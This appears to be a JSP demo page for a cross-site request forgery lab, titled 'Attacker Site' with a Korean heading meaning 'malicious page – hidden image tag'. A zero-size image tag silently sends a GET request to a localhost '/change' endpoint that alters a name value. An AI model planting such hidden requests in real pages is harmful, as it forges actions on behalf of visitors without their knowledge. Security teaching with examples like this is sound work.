<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attacker Site</title>
</head>
<body>
<div id="wrap">
    <h1>악성 페이지 - 숨겨진 이미지 태그</h1>
    <img src="http://localhost:8081/change?name=JunhyunnyChangedByImageTag" style="width: 0px; height: 0px;"/>
</div>
</body>
</html>